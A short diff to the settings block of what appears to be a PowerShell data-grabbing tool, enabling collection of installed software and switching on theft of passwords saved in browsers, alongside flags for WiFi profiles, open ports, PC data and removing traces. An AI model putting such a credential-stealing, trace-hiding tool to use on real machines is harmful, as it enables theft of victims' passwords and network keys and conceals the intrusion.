@@ -20,7 +20,8 @@ $gatherPcData = $true  <# Gather PC data #>
 $gatherWifiProfiles = $true  <# Gather WiFi profiles #>
 $gatherOpenPorts = $true  <# Gather open ports #>
 $executeExe = $false  <# Execute and EXE File #>
-$gatherBrowserPass = $false <# [WIP] Gather passwords saved in browsers #>
+$gatherInstalledSoftware = $true <# Gather installed softwares #>
+$gatherBrowserPass = $true <# Gather passwords saved in browsers #>
 $removeTraces = $true  <# Remove traces #>
 ```
 
